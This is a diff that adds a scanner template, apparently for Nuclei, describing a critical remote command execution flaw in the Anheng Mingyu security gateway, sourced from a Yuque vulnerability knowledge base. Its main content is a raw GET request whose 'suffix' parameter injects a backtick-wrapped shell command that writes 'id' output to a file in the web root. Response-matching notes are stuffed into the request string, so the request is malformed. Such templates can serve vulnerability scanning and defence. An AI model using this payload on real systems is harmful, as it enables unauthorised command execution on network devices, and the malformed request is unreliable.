@@ -1,0 +1,34 @@
+id: poc-xzq7kggowsfoa9b8
+info:
+  name: 安恒明御安全网关远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xzq7kggowsfoa9b8'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xzq7kggowsfoa9b8
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix=%60id+%3E/usr/local/webui/frrgkquigh.txt%60 HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    /frrgkquigh.txt'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
